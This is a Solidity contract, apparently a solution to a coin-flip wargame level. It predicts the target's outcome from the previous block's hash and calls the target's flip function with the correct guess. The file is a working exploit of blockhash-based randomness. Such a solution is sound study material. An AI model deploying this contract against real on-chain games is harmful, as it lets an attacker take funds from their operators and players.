// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract ICoinFlip {
  function flip(bool _guess) public returns (bool) {}
}

contract CoinGuesser {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip flipContract;

    constructor(address _flipContract) {
        flipContract = ICoinFlip(_flipContract);
    }
    
    function guessRight() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;
        flipContract.flip(guess);
    }

}